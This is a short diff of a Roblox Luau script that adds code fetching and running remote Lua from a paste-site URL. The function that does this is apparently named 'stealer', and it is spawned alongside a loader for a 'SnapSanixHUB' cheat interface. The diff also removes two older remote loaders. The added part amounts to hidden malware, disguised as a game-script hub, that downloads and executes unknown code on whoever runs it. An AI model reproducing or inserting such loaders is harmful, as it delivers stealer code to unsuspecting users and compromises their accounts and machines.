@@ -1,3 +1,8 @@
-lID="05847932-6151-4aea-9e13-2723c23de8a7";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/VmLdfHAkRrKVCjVz/raw", true))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
